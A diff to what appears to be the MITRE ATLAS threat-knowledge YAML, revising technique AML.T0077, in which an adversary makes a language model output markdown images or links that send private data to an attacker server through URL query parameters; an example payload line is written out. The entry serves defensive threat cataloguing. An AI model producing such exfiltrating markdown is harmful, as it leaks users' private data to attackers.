@@ -2155,25 +2155,38 @@
 - &llm_rendering
   id: AML.T0077
   name: LLM Response Rendering
-  description: "An adversary may get a large language model (LLM) to respond with\
-    \ private information that is hidden from the user when the response is rendered\
-    \ by the user's client. The private information is then exfiltrated. This can\
-    \ take the form of rendered images, which automatically make a request to an adversary\
-    \ controlled server. \n\nThe adversary gets AI to present an image to the user,\
-    \ which is rendered by the user's client application with no user clicks required.\
-    \ The image is hosted on an attacker-controlled website, allowing the adversary\
-    \ to exfiltrate data through image request parameters. Variants include HTML tags\
-    \ and markdown\n\nFor example, an LLM may produce the following markdown:\n```\n\
-    ![ATLAS](https://atlas.mitre.org/image.png?secrets=private_data)\n```\n\n\
-    Which is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\
-    private_data\">\n```\n\nWhen the request is received by the adversary's server\
-    \ hosting the requested image, they receive the contents of the `secrets` query\
-    \ parameter."
+  description: 'An adversary may get a large language model (LLM) to respond with
+    private information that is hidden from the user when the response is rendered
+    by the user''s client. The private information is then exfiltrated. This can take
+    the form of rendered images which automatically make a request to an adversary
+    controlled server, or clickable links which require user interaction.
+
+
+    For example, an LLM may produce the following markdown:
+
+    ```
+
+    ![ATLAS](https://atlas.mitre.org/image.png?secrets=private_data)
+
+    ```
+
+
+    Which is rendered by the client as:
+
+    ```
+
+    <img src="https://atlas.mitre.org/image.png?secrets=private_data">
+
+    ```
+
+
+    When the request is received by the adversary''s server hosting the requested
+    image, they receive the contents of the `secrets` query parameter.'
   object-type: technique
   tactics:
   - '{{exfiltration.id}}'
   created_date: 2025-04-15
-  modified_date: 2025-04-15
+  modified_date: 2025-04-22
 
 - &acquire_serverless
   id: AML.T0008.004
